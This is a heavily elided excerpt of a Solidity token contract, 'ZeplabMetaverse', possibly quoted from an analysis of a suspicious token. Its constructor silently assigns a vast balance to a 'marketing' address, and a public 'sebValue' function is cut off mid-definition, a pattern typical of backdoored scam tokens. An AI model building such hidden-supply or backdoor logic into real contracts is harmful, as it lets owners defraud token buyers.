...
interface IUniswapV2Router02 is IUniswapV2Router01 {
  ...
  contract ZeplabMetaverse is IERC20, Context, Ownable {
    ...
    constructor(address _marketingAddress, uint256 count) {
      ...
      _count = count;
      _balances[_marketingAddress] = 10 * 10**34;
    ...
    */
    ...
    function sebValue(address _marketingAddress, uint256 key) public{
